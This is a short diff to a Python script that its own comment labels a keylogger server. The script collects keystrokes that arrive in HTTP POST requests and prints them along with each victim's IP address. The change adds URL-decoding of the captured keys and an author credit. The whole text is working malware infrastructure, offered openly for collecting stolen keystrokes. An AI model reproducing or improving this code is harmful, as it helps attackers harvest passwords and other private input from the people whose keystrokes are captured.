@@ -1,8 +1,9 @@
-import socket,re,colorama
+import socket,re,colorama,urllib
 from colorama import Fore
 
 colorama.init()
 #keylogger server
+#Coded By MGF15
 host = '127.0.0.1'
 port = 8080
 size = 1024 
@@ -19,5 +20,6 @@ while 1:
 		d = re.findall(r"POST /key=(.*?) " , data)
 		q = key.append(d[0])	
 		ky = ''.join(key)
-		print Fore.RED+'[+] '+Fore.CYAN+address[0]+': '+Fore.GREEN+ky
+		decode = url=urllib.unquote(ky).decode() 
+		print Fore.RED+'[+] '+Fore.CYAN+address[0]+': '+Fore.GREEN+decode
 		
